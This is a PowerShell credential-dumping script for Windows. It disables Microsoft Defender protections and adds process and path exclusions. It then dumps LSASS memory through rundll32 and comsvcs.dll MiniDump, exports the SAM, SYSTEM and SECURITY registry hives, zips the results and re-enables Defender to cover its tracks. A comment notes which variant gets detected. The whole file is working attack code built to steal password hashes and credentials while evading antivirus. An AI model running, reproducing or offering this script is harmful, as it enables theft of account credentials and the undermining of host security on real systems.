Import-Module Microsoft.Powershell.Archive

$computername=hostname

if([System.IO.Directory]::Exists("C:\Windows\Temp\${computername}"))
{
    rmdir -Force "C:\Windows\Temp\${computername}" -Recurse
}

mkdir "C:\Windows\Temp\${computername}"

Set-MpPreference -DisableRealTimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableBehaviorMonitoring $true

Add-MpPreference -ExclusionPath "C:\Windows\Temp\${computername}"
Add-MpPreference -ExclusionProcess "C:\Windows\System32\wsmprovhost.exe"
Add-MpPreference -ExclusionProcess "C:\Windows\System32\rundll32.exe"
Add-MpPreference -ExclusionProcess "C:\Windows\System32\reg.exe"

# this syntax still gets detected and blocked 
# C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $(Get-Process lsass | select -ExpandProperty Id) C:\Windows\Temp\${computername}\debug.log

$lsass_pid = Get-Process lsass | select -ExpandProperty Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\Windows\Temp\lsass.dmp

reg SAVE HKLM\SYSTEM C:\Windows\Temp\${computername}\\SYSTEM.reg
reg SAVE HKLM\SECURITY C:\Windows\Temp\${computername}\SECURITY.reg
reg SAVE HKLM\SAM C:\Windows\Temp\${computername}\SAM.reg

Compress-Archive -Path "C:\Windows\Temp\${computername}" -DestinationPath "C:\Windows\Temp\${computername}.zip" -Force

rmdir -Force "C:\Windows\Temp\${computername}" -Recurse

Set-MpPreference -DisableRealTimeMonitoring $false
Set-MpPreference -DisableIOAVProtection $false
Set-MpPreference -DisableBlockAtFirstSeen $false
Set-MpPreference -DisableBehaviorMonitoring $false

Remove-MpPreference -ExclusionPath "C:\Windows\Temp\${computername}"
Remove-MpPreference -ExclusionProcess "C:\Windows\System32\wsmprovhost.exe"
Remove-MpPreference -ExclusionProcess "C:\Windows\System32\rundll32.exe"
Remove-MpPreference -ExclusionProcess "C:\Windows\System32\reg.exe"
